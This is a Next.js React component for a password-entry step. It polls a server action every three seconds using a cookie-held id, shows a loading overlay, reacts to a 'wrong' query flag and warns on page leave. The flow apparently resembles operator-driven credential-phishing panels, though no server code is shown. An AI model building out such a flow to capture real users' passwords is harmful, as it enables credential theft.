"use client";
import { getUpdatePage } from "@/actions";
import Cookies from "js-cookie";
import { useParams, useRouter, useSearchParams } from "next/navigation";
import { useMemo, useEffect, useRef, useState } from "react";
import { useFormStatus } from "react-dom";
import PageLeaveMessage from "./PageLeaveMessage";

export default function PasswordFillSubmission() {
  const searchParams = useSearchParams();
  const { id } = useParams();
  const loadingRef = useRef(false);
  const [loading, setLoading] = useState(false);
  const router = useRouter();
  const getUpdate = useMemo(
    () => async () => {
      let dataId = Cookies.get("dataId");
      await getUpdatePage(dataId, id);
      loadingRef.current = false;
    },
    [id]
  );
  useEffect(() => {
    const intervalId = setInterval(async () => {
      loadingRef.current = true;
      await getUpdate();
    }, 3000);
    if (searchParams.get("wrong")) {
      setLoading(false);
    }
    return () => clearInterval(intervalId);
  }, [getUpdate, searchParams]);

  const { pending } = useFormStatus();

  return (
    <div>
      <PageLeaveMessage />
      <div
        className={`${
          loadingRef.current || loading
            ? "w-screen h-screen flex items-center justify-center absolute top-0 left-0 opacity-95 bg-slate-400"
            : "hidden"
        }`}
      >
        <div
          className="inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-current border-e-transparent align-[-0.125em] text-surface motion-reduce:animate-[spin_1.5s_linear_infinite]"
          role="status"
        >
          <span className="!absolute !-m-px !h-px !w-px !overflow-hidden !whitespace-nowrap !border-0 !p-0 ![clip:rect(0,0,0,0)]">
            Loading...
          </span>
        </div>
      </div>
      <button
        onClick={() => {
          setLoading(true);
          router.push(window.location.href.split("?")[0]);
        }}
        disabled={pending}
        className="bg-blue-600 text-white px-5 py-2 rounded-3xl"
      >
        Next
      </button>
    </div>
  );
}
